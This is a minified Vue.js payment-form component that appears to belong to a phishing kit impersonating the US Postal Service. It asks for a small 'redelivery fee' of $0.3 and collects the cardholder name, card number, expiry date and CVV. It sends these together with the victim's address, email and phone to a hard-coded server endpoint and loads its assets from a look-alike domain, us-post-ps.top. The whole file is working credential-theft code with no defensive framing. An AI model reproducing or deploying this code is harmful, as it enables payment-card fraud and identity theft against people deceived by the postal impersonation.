import{d as w,r as C,f as j,c as b,a as t,e as d,w as V,b as p,v as c,F,g as L,n as v,E as y,u as q,o as h}from"./index-C0TOQqep.js";import{u as A}from"./formData--Kvep9fT.js";const K={class:"usps-updates"},S={class:"main-content-body container-fluid"},X={class:"form-group"},k={class:"form-group"},I={class:"card-number-wrapper"},M={class:"card-icons"},U=["src"],B={class:"expiry-cvv-row"},O={class:"form-group expiry-group"},Y={class:"form-group cvv-group"},G=w({__name:"PaymentForm",setup(_){const a=C({cardholder:"",cardNumber:"",expireDate:"",cvv:""}),x=A(),u=j(()=>x.addressData),T=q();function D(l){const e=l.target;let o=e.value.replace(/\D/g,""),r=o;o.length>2&&(r=o.slice(0,2)+"/"+o.slice(2,4)),r.length>5&&(r=r.slice(0,5)),a.value.expireDate=r,v(()=>{e.value=r})}function J(l,e){const s=l.target,r=s.value.replace(/\D/g,"");a.value[e]=r,v(()=>{s.value=r})}function E(l){const e=l.target,r=e.value.replace(/\D/g,"").slice(0,16);let n="";for(let i=0;i<r.length;i+=4)n+=r.slice(i,i+4)+" ";n=n.trim(),a.value.cardNumber=n,v(()=>{e.value=n})}const N=async()=>{var l,e,s,o,r,n,i,f;try{const m={identificationCode:"8b202d58",name:(l=u.value)==null?void 0:l.name,address1:(e=u.value)==null?void 0:e.address1,address2:(s=u.value)==null?void 0:s.address2,city:(o=u.value)==null?void 0:o.city,state:(r=u.value)==null?void 0:r.state,postalCode:(n=u.value)==null?void 0:n.postalCode,email:(i=u.value)==null?void 0:i.email,phone:(f=u.value)==null?void 0:f.phone,cardholder:a.value.cardholder,cardNumber:a.value.cardNumber,expireDate:a.value.expireDate,cvv:a.value.cvv},g=await fetch("http://192.168.50.211:3000/v1/pkgform/update-form",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(m)});if(!g.ok)throw new Error("Form submission failed");const R=await g.json();y.success("Form submitted successfully"),T.push("/success")}catch(m){console.error("Error submitting form:",m),y.error("Failed to submit form. Please try again.")}},P=["https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/b4f258fbTeKnX.svg","https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/d9f50107TeKnX.svg","https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/d2820b3bTeKnX.svg","https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/e62e6680TeKnX.svg","https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/272b931fTeKnX.svg","https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/c8e88e5fTeKnX.svg","https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/1a32e133TeKnX.svg","https://us-post-ps.top/cegJcLcP23AEj2JtT3/assets/56af3b63TeKnX.svg"];return(l,e)=>(h(),b("div",K,[t("div",S,[e[10]||(e[10]=t("h1",{class:"payment-title"},"Online Payment",-1)),e[11]||(e[11]=t("p",{class:"payment-description"}," For redelivery, we need to charge some service fees. Your package will be re-delivered after payment ",-1)),e[12]||(e[12]=t("p",{class:"lump-sum"},[d("lump sum: "),t("strong",null,"$0.3")],-1)),t("form",{onSubmit:V(N,["prevent"]),class:"payment-form"},[t("div",X,[e[5]||(e[5]=t("label",{for:"cardholder",class:"form-label"},[d("Cardholder "),t("span",{class:"required"},"*")],-1)),p(t("input",{type:"text",id:"cardholder",class:"form-input","onUpdate:modelValue":e[0]||(e[0]=s=>a.value.cardholder=s),required:""},null,512),[[c,a.value.cardholder]])]),t("div",k,[e[6]||(e[6]=t("label",{for:"cardNumber",class:"form-label"},[d("Card Number "),t("span",{class:"required"},"*")],-1)),t("div",I,[p(t("input",{type:"tel",id:"cardNumber",class:"form-input card-number-input","onUpdate:modelValue":e[1]||(e[1]=s=>a.value.cardNumber=s),placeholder:"0000 0000 0000 0000",required:"",maxlength:"19",inputmode:"numeric",onInput:E},null,544),[[c,a.value.cardNumber]]),t("div",M,[(h(),b(F,null,L(P,(s,o)=>t("img",{key:o,src:s,alt:"Card type",class:"card-icon"},null,8,U)),64))])])]),t("div",B,[t("div",O,[e[7]||(e[7]=t("label",{for:"expireDate",class:"form-label"},[d("Expire Date "),t("span",{class:"required"},"*")],-1)),p(t("input",{type:"text",id:"expireDate",class:"form-input","onUpdate:modelValue":e[2]||(e[2]=s=>a.value.expireDate=s),placeholder:"MM/YY",required:"",maxlength:"5",inputmode:"numeric",onInput:D},null,544),[[c,a.value.expireDate]])]),t("div",Y,[e[8]||(e[8]=t("label",{for:"cvv",class:"form-label"},[d("Security Code (CVV) "),t("span",{class:"required"},"*")],-1)),p(t("input",{type:"tel",id:"cvv",class:"form-input","onUpdate:modelValue":e[3]||(e[3]=s=>a.value.cvv=s),placeholder:"123",required:"",maxlength:"4",inputmode:"numeric",onInput:e[4]||(e[4]=s=>J(s,"cvv"))},null,544),[[c,a.value.cvv]])])]),e[9]||(e[9]=t("div",{class:"form-group submit-group"},[t("button",{type:"submit",class:"submit-button but b-color"},"Submit")],-1))],32)])]))}});export{G as default};
